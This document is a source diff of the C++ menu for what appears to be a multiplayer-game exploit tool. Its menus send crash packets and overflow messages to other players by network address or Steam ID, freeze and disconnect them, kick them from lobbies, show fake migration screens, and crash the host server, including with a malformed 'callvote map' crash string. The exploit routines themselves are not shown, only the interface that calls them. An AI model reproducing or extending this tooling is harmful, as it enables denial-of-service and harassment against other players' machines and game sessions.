@@ -3,8 +3,15 @@
 
 namespace menu
 {
-	bool initialized = false, open = false;
-	std::vector<std::string> console_items;
+	bool initialized = false, open = true;
+	ImFont* glacial_indifference_bold;
+	ImFont* glacial_indifference;
+
+	void set_fonts()
+	{
+		glacial_indifference_bold = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetSecondaryFont().data(), 18.0f);
+		glacial_indifference = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetPrimaryFont().data(), 18.0f);
+	}
 
 	void set_style_color()
 	{
@@ -56,6 +63,7 @@ namespace menu
 		ImGui::GetIO().FontDefault = ImGui::GetIO().Fonts->AddFontDefault();
 
 		set_style_color();
+		set_fonts();
 
 		style.WindowPadding = { 8.0f, 2.0f };
 		style.FramePadding = { 4.0f , 4.0f };
@@ -136,10 +144,11 @@ namespace menu
 
 			if (session == nullptr)
 			{
+				ImGui::EndTabItem();
 				return;
 			}
 			
-			const auto our_client_num = static_cast<std::uint32_t>(game::Party_FindMemberByXUID(game::LiveUser_GetXuid(0)));
+			const auto our_client_num = static_cast<std::uint32_t>(game::LobbySession_GetClientNumByXuid(game::LiveUser_GetXuid(0)));
 			const auto in_game = game::in_game();
 			
 			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
@@ -191,7 +200,7 @@ namespace menu
 					}
 					else
 					{
-						ImGui::PushStyleColor(ImGuiCol_Text, player_xuid == game::LiveUser_GetXuid(0)
+						ImGui::PushStyleColor(ImGuiCol_Text, game::LiveUser_IsXUIDLocalPlayer(player_xuid)
 							? ImColor(0, 255, 127, 250).Value : ImColor(200, 200, 200, 250).Value);
 					}
 
@@ -208,14 +217,6 @@ namespace menu
 					}
 
 					const auto netadr = target_client->activeClient->sessionInfo[session->type].netAdr;
-					const auto is_bot = netadr.type == game::NA_BOT;
-
-					if (is_bot)
-					{
-						ImGui::SameLine(0, spacing);
-
-						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "[BOT]");
-					}
 
 					draw_friend_name(netadr, player_name, player_xuid); 
 					
@@ -225,7 +226,7 @@ namespace menu
 					if (selected)
 					{
 						friend_player_name = player_name; 
-						game::oob::send_connection_test(netadr, client_num);
+						exploit::lobby_msg::send_connection_test(netadr, player_xuid);
 						
 						ImGui::OpenPopup(popup.data());
 					}
@@ -254,7 +255,7 @@ namespace menu
 
 								if (ImGui::Button("Add friend"))
 								{
-									friends::friends.emplace_back(friends::friends_t{ player_xuid, friend_player_name, ip_string });
+									friends::friends.emplace_back(friends::friend_info{ player_xuid, friend_player_name });
 									friends::write_to_friends();
 								}
 
@@ -279,40 +280,53 @@ namespace menu
 						ImGui::Separator();
 
 						const auto can_connect_to_player = game::can_connect_to_player(client_num, player_xuid);
-						
-						if (ImGui::MenuItem("Crash player", nullptr, nullptr, can_connect_to_player && !is_bot))
+
+						if (ImGui::BeginMenu("Crash player##" + std::to_string(client_num)))
 						{
-							exploit::send_crash(netadr);
+							static auto freeze = false;
+							ImGui::Checkbox("Freeze", &freeze);
+							
+							if (ImGui::MenuItem("Crash"))
+							{
+								if (freeze)
+								{
+									exploit::instant_message::send_info_response_overflow({ player_xuid });
+								}
+								
+								exploit::send_crash(netadr, player_xuid);
+							}
+
+							ImGui::EndMenu();
 						}
 
-						if (ImGui::BeginMenu("Exploits##" + std::to_string(client_num), can_connect_to_player && !is_bot))
+						if (ImGui::BeginMenu("Exploits##" + std::to_string(client_num)))
 						{
-							if (ImGui::MenuItem("Show migration screen"))
+							if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, can_connect_to_player))
 							{
 								exploit::send_mstart_packet(netadr);
 							}
 
-							if (ImGui::MenuItem("Immobilize"))
+							if (ImGui::MenuItem("Immobilize", nullptr, nullptr, can_connect_to_player))
 							{
 								exploit::send_request_stats_packet(netadr);
 							}
 
-							if (ImGui::MenuItem("Remove"))
-							{
-								game::LobbyClientMsg_SendDisconnect(0, game::session->type, player_xuid);
-							}
-
-							if (ImGui::MenuItem("Remove from party"))
-							{
-								exploit::send_disconnect_client(player_xuid);
-							}
-
-							if (ImGui::MenuItem("Kick from lobby"))
+							if (ImGui::MenuItem("Kick from lobby", nullptr, nullptr, can_connect_to_player))
 							{
 								exploit::send_connect_response_migration_packet(netadr);
 							}
 
-							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num)))
+							if (ImGui::MenuItem("Disconnect client from lobby"))
+							{
+								exploit::lobby_msg::send_disconnect_client(player_xuid);
+							}
+
+							if (ImGui::MenuItem("Disconnect from lobby"))
+							{
+								exploit::lobby_msg::send_disconnect(player_xuid);
+							}
+
+							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num), can_connect_to_player))
 							{
 								static auto string_input = ""s;
 
@@ -356,61 +370,6 @@ namespace menu
 
 			ImGui::PopStyleVar();
 			ImGui::EndColumns();
-			ImGui::EndTabItem();
-		}
-	}
-
-	void draw_console(const float width, const float spacing)
-	{
-		if (ImGui::BeginTabItem("Console"))
-		{
-			static ImGuiTextFilter filter;
-			ImGui::TextUnformatted("Search Console");
-			filter.Draw("##search_console", width * 0.85f);
-
-			ImGui::SameLine(0.0f, spacing);
-			
-			if (ImGui::Button("Clear", { width * 0.15f, 0.0f }))
-			{
-				console_items.clear();
-			}
-
-			ImGui::Separator();
-
-			if (ImGui::BeginChild("##console_header", {}, true, ImGuiWindowFlags_HorizontalScrollbar))
-			{
-				for (auto i = 0u; i != console_items.size(); ++i)
-				{
-					const auto item = console_items[i];
-
-					if (!filter.PassFilter(item))
-						continue;
-
-					const auto selected = ImGui::Selectable(item + "##"s + std::to_string(i));
-					const auto popup = "console_message##" + std::to_string(i);
-
-					if (selected)
-					{
-						ImGui::OpenPopup(popup.data());
-					}
-
-					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
-					{
-						if (ImGui::MenuItem("Copy message"))
-						{
-							ImGui::LogToClipboardUnformatted(item);
-						}
-
-						ImGui::EndPopup();
-					}
-				}
-
-				if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY())
-					ImGui::SetScrollHereY(1.0f);
-
-				ImGui::EndChild();
-			}
-
 			ImGui::EndTabItem();
 		}
 	}
@@ -503,8 +462,8 @@ namespace menu
 						}
 					}
 
-					ImGui::Checkbox("Log out-of-band packets", &events::connectionless_packet::log_packets);
-					ImGui::Checkbox("Log instant messages", &events::instant_message::dispatch::log_messages);
+					ImGui::Checkbox("Log out-of-band packets", &events::connectionless_packet::log_commands);
+					ImGui::Checkbox("Log instant messages", &events::instant_message::log_messages);
 					ImGui::Checkbox("Log lobby messages", &events::lobby_msg::log_messages);
 
 					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
@@ -518,48 +477,42 @@ namespace menu
 
 				if (ImGui::BeginTabItem("Server"))
 				{
-					if (ImGui::CollapsingHeader("Game settings", ImGuiTreeNodeFlags_Leaf))
-					{
-
-					}
-
 					if (ImGui::CollapsingHeader("Exploits", ImGuiTreeNodeFlags_Leaf))
 					{
-						if (begin_section("Send crash"))
+						static auto target_steam_id{ ""s };
+
+						ImGui::SetNextItemWidth(width * 0.85f);
+						ImGui::InputTextWithHint("##target_steam_id", "Steam ID", &target_steam_id); 
+
+						const auto target_id{ utils::atoll(target_steam_id) };
+
+						if (ImGui::MenuItem("Send crash", nullptr, nullptr, target_id && !target_steam_id.empty()))
 						{
-							static auto steam_id_input = ""s;
-
-							ImGui::SetNextItemWidth(width * 0.85f);
-							ImGui::InputTextWithHint("##target_steam_id", "Steam ID", &steam_id_input);
-
-							ImGui::SameLine();
-
-							if (ImGui::Button("Execute##execute_crash", { 64.0f, 0.0f }))
-							{
-								const auto target_steam_id = utils::atoll(steam_id_input);
-
-								if (target_steam_id)
-								{
-									events::instant_message::send_friend_message_crash(target_steam_id);
-									events::instant_message::send_info_response_overflow(target_steam_id);
-								}
-							}
+							exploit::instant_message::send_friend_message_crash({ target_id });
+							exploit::instant_message::send_info_response_overflow({ target_id });
 						}
+
+						if (ImGui::MenuItem("Send popup", nullptr, nullptr, target_id && !target_steam_id.empty()))
+						{
+							exploit::instant_message::send_popup({ target_id });
+						}
+
+						ImGui::Separator();
 
 						if (ImGui::MenuItem("Endgame"))
 						{
-							game::Cbuf_AddText(0, ("mr " + std::to_string(game::cl()->serverId) + " 0 endround").data());
+							command::execute("mr " + std::to_string(game::cl()->serverId) + " 0 endround");
 						}
 						
 						if (ImGui::MenuItem("Send crash text"))
 						{
-							game::Cbuf_AddText(0, "callvote map \"^H\xff\xff\xff\deez\"");
+							const auto command = utils::string::va("callvote map \"%s\"", game::CL_AddMessageIcon("postfx_electrified").data());
+							command::execute(command);
 						}
 
 						if (ImGui::MenuItem("Crash server"))
 						{
-							game::LobbyClientMsg_SendModifiedStats(0, game::session->type);
-							game::Cbuf_AddText(0, "loadside 0 deez \"balls;quit;\" 1");
+							exploit::send_crash(game::session->host.info.netAdr, game::session->host.info.xuid);
 						}
 					}
 					
@@ -581,7 +534,7 @@ namespace menu
 
 							if (ImGui::Button("Execute##execute_command", { 64.0f, 0.0f }))
 							{
-								game::Cbuf_AddText(0, command_input.data());
+								command::execute(command_input);
 							}
 						}
 
@@ -597,7 +550,7 @@ namespace menu
 							if (ImGui::Button("Join##join_via_steam_id", { 64.0f, 0.0f }))
 							{
 								const auto command = "join " + steam_id_input;
-								game::Cbuf_AddText(0, command.data());
+								command::execute(command);
 							}
 						}
 					}
@@ -605,9 +558,9 @@ namespace menu
 					ImGui::EndTabItem();
 				}
 
-				draw_player_list(width, spacing);
+				menu::draw_player_list(width, spacing);
 				friends::draw_friends_list(width, spacing);
-				draw_console(width, spacing);
+				session::draw_session_list(width, spacing);
 			}
 		}
 	}
@@ -620,8 +573,6 @@ namespace menu
 
 			rendering::dx::on_frame(swap_chain);
 			input::on_key(VK_F1, toggle, true);
-
-			friends::refresh_friends();
 		}
 	}
 }
